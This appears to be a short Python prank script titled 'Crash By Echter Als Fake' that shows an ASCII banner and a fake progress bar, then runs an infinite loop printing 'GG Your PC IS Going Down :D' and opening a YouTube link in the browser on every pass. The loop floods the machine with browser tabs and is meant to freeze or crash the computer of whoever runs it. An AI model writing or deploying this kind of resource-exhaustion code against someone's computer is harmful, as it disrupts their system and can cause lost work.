from colorama import *
from tqdm import tqdm
from pyfiglet import Figlet
import time
from time import sleep
from random import uniform
import webbrowser
f = Figlet(font='big')
time.sleep(2)
text1 = "Crash By Echter Als Fake"
text2 = "GG's To your Computer"
print(Fore.LIGHTYELLOW_EX + f.renderText(text=text1))

for i in tqdm(range(100)):
    sleep(uniform(0.05, 0.001))
print(".")
time.sleep(0.1)
print(".")
while True:
    print("GG Your PC IS Going Down :D")
    webbrowser.open('https://www.youtube.com/watch?v=5BZLz21ZS_Y&t=2s')

